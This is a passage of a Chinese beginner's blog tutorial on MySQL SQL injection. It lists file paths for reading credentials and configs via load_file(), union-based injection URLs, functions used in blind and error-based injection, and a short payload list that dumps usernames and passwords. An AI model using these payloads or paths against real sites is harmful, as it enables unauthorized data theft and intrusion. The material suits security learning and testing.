</code></pre><p>修改 secure_file_priv 的值:<br>windows 下：修改 my.ini 在 [mysqld] 内加入 secure_file_priv =<br>linux 下：修改 my.cnf 在 [mysqld] 内加入 secure_file_priv =<br>然后重启 mysql，再查询 secure_file_priv</p><h3 id="load_file-常用路径"><a class="anchor" href="#load_file-常用路径">#</a> load_file () 常用路径：</h3><p>1、 replace(load_file(0×2F6574632F706173737764),0×3c,0×20)<br>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p><p>上面两个是查看一个 PHP 文件里完全显示代码。有些时候不替换一些字符，如 “&lt;” 替换成” 空格” 返回的是网页。而无法查看到代码.</p><p>3、 load_file (char (47)) 可以列出 FreeBSD,Sunos 系统根目录<br>4、/etc tpd/conf tpd.conf 或 /usr/local/apche/conf tpd.conf 查看 linux APACHE 虚拟主机配置文件<br>5、c:\Program Files\Apache Group\Apache\conf \httpd.conf 或 C:\apache\conf \httpd.conf 查看 WINDOWS 系统 apache 文件<br>6、c:/Resin-3.0.14/conf/resin.conf 查看 jsp 开发的网站 resin 文件配置信息.<br>7、c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看 linux 系统配置的 JSP 虚拟主机<br>8、d:\APACHE\Apache2\conf\httpd.conf<br>9、C:\Program Files\mysql\my.ini<br>10、…/themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径<br>11、 c:\windows\system32\inetsrv\MetaBase.xml 查看 IIS 的虚拟主机配置文件<br>12、 /usr/local/resin-3.0.22/conf/resin.conf 针对 3.0.22 的 RESIN 配置文件查看<br>13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上<br>14 、/usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE 虚拟主机查看<br>15、 /etc/sysconfig/iptables 本看防火墙策略<br>16 、 usr/local/app/php5 b/php.ini PHP 的相当设置<br>17 、/etc/my.cnf MYSQL 的配置文件<br>18、 /etc/redhat-release 红帽子的系统版本<br>19 、C:\mysql\data\mysql\user.MYD 存在 MYSQL 系统中的用户密码<br>20、/etc/sysconfig/network-scripts/ifcfg-eth0 查看 IP.<br>21、/usr/local/app/php5 b/php.ini//PHP 相关设置<br>22、/usr/local/app/apache2/conf/extra tpd-vhosts.conf// 虚拟网站设置<br>23、C:\Program Files\<span class="exturl" data-url="aHR0cDovL1JoaW5vU29mdC5jb20=">RhinoSoft.com</span>\Serv-U\ServUDaemon.ini<br>24、c:\windows\my.ini<br>25、c:\boot.ini</p><h2 id="网站常用配置文件"><a class="anchor" href="#网站常用配置文件">#</a> 网站常用配置文件</h2><p>config.inc.php、config.php。</p><p>load_file（）时要用 replace（load_file (HEX)，char (60),char (32)）<br>注：<br>Char (60) 表示 &lt;<br>Char（32）表示 空格</p><h2 id="手工注射时出现的问题"><a class="anchor" href="#手工注射时出现的问题">#</a> 手工注射时出现的问题：</h2><p>当注射后页面显示：<br>Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation ‘UNION’<br>如：/instrument.php?ID=13 and 1=2 union select 1,load_file (0x433A5C626F6F742E696E69),3,4,user ()<br>这是由于前后编码不一致造成的，<br>解决方法：在参数前加上 unhex (hex (参数)) 就可以了。上面的 URL 就可以改为：<br>/instrument.php?ID=13 and 1=2 union select 1,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))</p><h1 id="常见函数"><a class="anchor" href="#常见函数">#</a> 常见函数</h1><font color="DeepSkyBlue"><h2 id="length"><a class="anchor" href="#length">#</a> length()</h2><p>MySQL LENGTH (str) 函数的返回值为字符串的字节长度，使用 uft8（UNICODE 的一种变长字符编码，又称万国码）编码字符集时，一个汉字是 3 个字节，一个数字或字母是一个字节。</p><p>【实例】使用 LENGTH 函数计算字符串长度，输入的 SQL 语句和执行结果如下所示。</p><pre><code>mysql&gt; SELECT LENGTH('name'),LENGTH('数据库');
+----------------+---------------------+
|LENGTH('name')  | LENGTH('数据库')    |
+----------------+---------------------+
|              4 |                   9 |
+----------------+---------------------+
1 row in set (0.04 sec)
</code></pre><p>由运行结果可以看到，一个汉字是 3 个字节，“数据库” 字符串占 9 个字节。英文字符的个数和所占的字节相同，一个字符占 1 个字节。</p><h2 id="substr"><a class="anchor" href="#substr">#</a> substr()</h2><p>mysql substr () 函数<br>截取字符串</p><p>用法：substr (string string,num start,num length);</p><p>select substr (参数 1，参数 2，参数 3) from 表名<br>string 为字符串；start 为起始位置；length 为长度。</p><p>注意：mysql 中的 start 是从 1 开始的。</p><p>SUBSTR () 函数是 SUBSTRING () 函数的同义词，所以可以互换使用它们</p><h2 id="sleep"><a class="anchor" href="#sleep">#</a> sleep()</h2><h2 id="benchmark"><a class="anchor" href="#benchmark">#</a> benchmark()</h2><pre><code>
BENCHMARK(count,expr)   
BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。意欲用于mysql客户，它报告查询的执行时间。   
mysql&gt; select BENCHMARK(1000000,encode(&quot;hello&quot;,&quot;goodbye&quot;));   
+----------------------------------------------+   
| BENCHMARK(1000000,encode(&quot;hello&quot;,&quot;goodbye&quot;)) |   
+----------------------------------------------+   
| 0                                            |   
+----------------------------------------------+   
1 row in set (4.74 sec)  

</code></pre><h2 id="ifexpr1expr2expr3"><a class="anchor" href="#ifexpr1expr2expr3">#</a> if(expr1,expr2,expr3)</h2><p>if(length(database())&gt;5,sleep(5),1)</p><h2 id="datadir"><a class="anchor" href="#datadir">#</a> @@datadir</h2><p>数据库文件所在位置</p><h2 id="version_compile_os"><a class="anchor" href="#version_compile_os">#</a> @@version_compile_os</h2><p>查看当前操作系统</p><h2 id="concat"><a class="anchor" href="#concat">#</a> concat()</h2><p>语法及使用特点：<br>CONCAT(str1,str2,…)<br>返回结果为连接参数产生的字符串。如有任何一个参数为 NULL ，则返回值为 NULL。可以有一个或多个参数。</p><h2 id="concat_ws"><a class="anchor" href="#concat_ws">#</a> concat_ws()</h2><p>使用函数 CONCAT_WS（）。使用语法为：CONCAT_WS (separator,str1,str2,…)<br>CONCAT_WS () 代表 CONCAT With Separator ，是 CONCAT () 的特殊形式。第一个参数是其它参数的分隔符。分<br>隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，<br>则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是 CONCAT_WS () 不会忽略任何空字符串。 (然而会<br>忽略所有的 NULL）。<br>如 SELECT CONCAT_WS ('_',id,name) AS con_ws FROM info LIMIT 1; 返回结果为</p><pre><code>+----------+
| con_ws   |
+----------+
| 1_BioCyc |
+----------+
</code></pre><h2 id="group_concat"><a class="anchor" href="#group_concat">#</a> group_concat()</h2><p>区分 concat_ws () 与 group_concat () 函数<br>concat_ws (char (32,58,32),user (),database (),version ())<br>在 concat_ws 函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。</p><p>group_connect () 函数<br>完整的语法如下：<br>group_concat ([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])<br>功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果<br>说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 子句；separator 是一个字符串值，缺省为一个逗号。</p><p>图一，区别<br><img data-src="image001.png" alt=""></p><p>报错注入<br>0x7e ASCII ~</p><p>updatexml () 是更新 xml 文档的函数</p><p>语法 updatexml (目标 xml 文档，xml 路径，更新的内容)<br><img data-src="image002.png" alt=""></p><h2 id="php"><a class="anchor" href="#php">#</a> php</h2><h3 id="preg_math"><a class="anchor" href="#preg_math">#</a> preg_math()</h3><h3 id="floor"><a class="anchor" href="#floor">#</a> floor()</h3><p>语法<br>floor (x)<br>返回不大于 x 的下一个整数，将 x 的小数部分舍去取整。floor () 返回的类型仍然是 float，因为 float 值的范围通常比 integer 要大。</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token number">0.60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token number">0.40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token number">5.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5.9</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="9"></td><td><pre>//输出：</pre></td></tr><tr><td data-num="10"></td><td><pre>0</pre></td></tr><tr><td data-num="11"></td><td><pre>0</pre></td></tr><tr><td data-num="12"></td><td><pre>5</pre></td></tr><tr><td data-num="13"></td><td><pre>5</pre></td></tr><tr><td data-num="14"></td><td><pre>-6</pre></td></tr><tr><td data-num="15"></td><td><pre>-6</pre></td></tr></table></figure><p>html 实体编码</p></font><h1 id="sql-injection-payload"><a class="anchor" href="#sql-injection-payload">#</a> SQL injection payload</h1><p>用户名 密码<br>数字型</p><p><code>?id=-1 union select 1,(select group_concat(concat_ws(&quot;--&gt;&quot;,username,password) separator '&lt;br&gt;') from users),(@@datadir)</code></p><p>字段名</p><p><code>?id=-1 union select 1,2,(select group_concat(column_name separator '&lt;br&gt;') from information_schema.columns where table_name='users')</code></p><p>表名<br><code>?id=-1 union select 1,(select group_concat(table_name separator '&lt;br&gt;') from information_schema.tables where table_schema=database()),3</code></p><p>单引号括号<br><code>?id=-1') union select 1,(select group_concat(concat_ws(&quot;--&gt;&quot;,username,password) separator '&lt;br&gt;') from users),3 --+</code></p><div class="tags"><a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"><i class="ic i-tag"></i> sql注入</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2022-03-13 16:25:09" itemprop="dateModified" datetime="2022-03-13T16:25:09+08:00">2022-03-13</time> </span><span id="PenetrationTest/Web-Security/初学SQLinjection/" class="item leancloud_visitors" data-flag-title="初学SQLinjection" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/reward.jpg" alt="Or0kit 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Or0kit <i class="ic i-at"><em>@</em></i>Or0kit</li><li class="link"><strong>本文链接：</strong> <a href="https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/" title="初学SQLinjection">https://or0kit.github.io/PenetrationTest/Web-Security/初学SQLinjection/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/Programming/Python/python%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicivghyooj20zk0m8dir.jpg" title="python进程线程"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Python</span><h3>python进程线程</h3></a></div><div class="item right"><a href="/Internet/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%88SSH%E9%9A%A7%E9%81%93%EF%BC%89%E3%80%90%E8%BD%AC%E3%80%91/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicli9lfebj20zk0m84qp.jpg" title="SSH端口转发（SSH隧道）【转】"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 网络</span><h3>SSH端口转发（SSH隧道）【转】</h3></a></div></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlinjection-%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">SQLinjection 原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">3.</span> <span class="toc-text">SQL 注入的分类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql-50%E4%BB%A5%E4%B8%8A%E5%92%8Cmysql-50%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">4.</span> <span class="toc-text">MySQL 5.0 以上和 MySQL 5.0 以下版本的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#information_schema-%E5%BA%93"><span class="toc-number">4.1.</span> <span class="toc-text">INFORMATION_SCHEMA 库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#schemata%E8%A1%A8"><span class="toc-number">4.1.1.</span> <span class="toc-text">SCHEMATA 表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tables%E8%A1%A8"><span class="toc-number">4.1.2.</span> <span class="toc-text">TABLES 表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#columns%E8%A1%A8"><span class="toc-number">4.1.3.</span> <span class="toc-text">COLUMNS 表</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E5%85%B3%E4%BA%8Einformation_schema%E5%BA%93%E7%9A%84sql%E8%AF%AD%E5%8F%A5"><span class="toc-number">5.</span> <span class="toc-text">常用的关于 information_schema 库的 SQL 语句</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="toc-number">5.1.</span> <span class="toc-text">查询数据表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5"><span class="toc-number">5.2.</span> <span class="toc-text">查询字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93"><span class="toc-number">5.3.</span> <span class="toc-text">一句话总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-number">6.</span> <span class="toc-text">SQL 注入的基本流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">6.1.</span> <span class="toc-text">判断是否存在注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">6.2.</span> <span class="toc-text">判断注入类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F"><span class="toc-number">6.3.</span> <span class="toc-text">猜字段数量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%8B%E7%9C%8B%E5%93%AA%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%9B%9E%E6%98%BE"><span class="toc-number">6.4.</span> <span class="toc-text">看看哪个字段回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%89%88%E6%9C%AC%E7%94%A8%E6%88%B7"><span class="toc-number">6.5.</span> <span class="toc-text">查询数据库名，版本，用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E8%A1%A8-2"><span class="toc-number">6.6.</span> <span class="toc-text">查询数据表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5-2"><span class="toc-number">6.7.</span> <span class="toc-text">查询字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-number">6.8.</span> <span class="toc-text">查询数据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">7.1.</span> <span class="toc-text">宽字节注入产生的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">7.2.</span> <span class="toc-text">宽字节注入的手工注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8C%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">7.3.</span> <span class="toc-text">使用 SQLmap 进行宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="toc-number">8.</span> <span class="toc-text">常用姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5"><span class="toc-number">8.1.</span> <span class="toc-text">判断是否存在 SQL 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6"><span class="toc-number">8.2.</span> <span class="toc-text">暴字段长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%B9%E9%85%8D%E5%AD%97%E6%AE%B5"><span class="toc-number">8.3.</span> <span class="toc-text">匹配字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">8.4.</span> <span class="toc-text">暴字段位置（回显位）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E6%9A%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-number">8.5.</span> <span class="toc-text">利用内置函数暴数据库信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E7%94%A8%E7%8C%9C%E8%A7%A3%E5%8F%AF%E7%94%A8%E5%AD%97%E6%AE%B5%E6%9A%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%9C%89%E4%BA%9B%E7%BD%91%E7%AB%99%E4%B8%8D%E9%80%82%E7%94%A8"><span class="toc-number">8.6.</span> <span class="toc-text">不用猜解可用字段暴数据库信息 (有些网站不适用):</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">8.7.</span> <span class="toc-text">操作系统信息：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90"><span class="toc-number">8.8.</span> <span class="toc-text">数据库权限：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%BA%93-mysql50"><span class="toc-number">8.9.</span> <span class="toc-text">暴库 (mysql&gt;5.0)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%9C%E8%A1%A8"><span class="toc-number">8.10.</span> <span class="toc-text">猜表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5"><span class="toc-number">8.11.</span> <span class="toc-text">猜字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%AF%86%E7%A0%81"><span class="toc-number">8.12.</span> <span class="toc-text">暴密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%86%99%E9%A9%ACroot%E6%9D%83%E9%99%90"><span class="toc-number">8.13.</span> <span class="toc-text">直接写马 (Root 权限)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">8.14.</span> <span class="toc-text">文件读写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E6%96%B0%E7%89%B9%E6%80%A7secure_file_priv%E5%AF%B9%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">8.14.1.</span> <span class="toc-text">MYSQL 新特性 secure_file_priv 对读写文件的影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#load_file-%E5%B8%B8%E7%94%A8%E8%B7%AF%E5%BE%84"><span class="toc-number">8.14.2.</span> <span class="toc-text">load_file () 常用路径：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">8.15.</span> <span class="toc-text">网站常用配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%B0%84%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">8.16.</span> <span class="toc-text">手工注射时出现的问题：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">9.</span> <span class="toc-text">常见函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#length"><span class="toc-number">9.1.</span> <span class="toc-text">length()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#substr"><span class="toc-number">9.2.</span> <span class="toc-text">substr()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sleep"><span class="toc-number">9.3.</span> <span class="toc-text">sleep()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#benchmark"><span class="toc-number">9.4.</span> <span class="toc-text">benchmark()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ifexpr1expr2expr3"><span class="toc-number">9.5.</span> <span class="toc-text">if(expr1,expr2,expr3)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#datadir"><span class="toc-number">9.6.</span> <span class="toc-text">@@datadir</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#version_compile_os"><span class="toc-number">9.7.</span> <span class="toc-text">@@version_compile_os</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#concat"><span class="toc-number">9.8.</span> <span class="toc-text">concat()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#concat_ws"><span class="toc-number">9.9.</span> <span class="toc-text">concat_ws()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#group_concat"><span class="toc-number">9.10.</span> <span class="toc-text">group_concat()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-number">9.11.</span> <span class="toc-text">php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#preg_math"><span class="toc-number">9.11.1.</span> <span class="toc-text">preg_math()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#floor"><span class="toc-number">9.11.2.</span> <span class="toc-text">floor()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql-injection-payload"><span class="toc-number">10.</span> <span class="toc-text">SQL injection payload</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/PenetrationTest/Web-Security/Apache-Config/" rel="bookmark" title="Apache_Config">Apache_Config</a></li><li class="active"><a href="/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/" rel="bookmark" title="初学SQLinjection">初学SQLinjection</a></li><li><a href="/PenetrationTest/Web-Security/SQLMAP%E6%80%BB%E7%BB%93/" rel="bookmark" title="SQLMAP总结">SQLMAP总结</a></li><li><a href="/PenetrationTest/Web-Security/%E5%86%8D%E5%AD%A6SQLinjection/" rel="bookmark" title="再学SQLinjection">再学SQLinjection</a></li><li><a href="/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6XSS/" rel="bookmark" title="初学XSS">初学XSS</a></li><li><a href="/PenetrationTest/Web-Security/SQL-injection-payload-list/" rel="bookmark" title="SQL-injection-payload-list【转】">SQL-injection-payload-list【转】</a></li><li><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="web漏洞-文件上传">web漏洞-文件上传</a></li><li><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="web漏洞-文件包含">web漏洞-文件包含</a></li><li><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-CSRF/" rel="bookmark" title="web漏洞-CSRF">web漏洞-CSRF</a></li><li><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-SSRF/" rel="bookmark" title="web漏洞-SSRF">web漏洞-SSRF</a></li><li><a href="/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6webshell%E6%A3%80%E6%B5%8B/" rel="bookmark" title="初学webshell检测">初学webshell检测</a></li><li><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="web漏洞-业务逻辑漏洞">web漏洞-业务逻辑漏洞</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Or0kit" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Or0kit</p><div class="description" itemprop="description">临渊羡鱼，不如退而结网</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">204</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">48</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">363</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29t" title="https:&#x2F;&#x2F;github.com"><i class="ic i-github"></i></span> <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;twitter.com&#x2F;yourname"><i class="ic i-twitter"></i></span> <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;yourname"><i class="ic i-zhihu"></i></span> <span 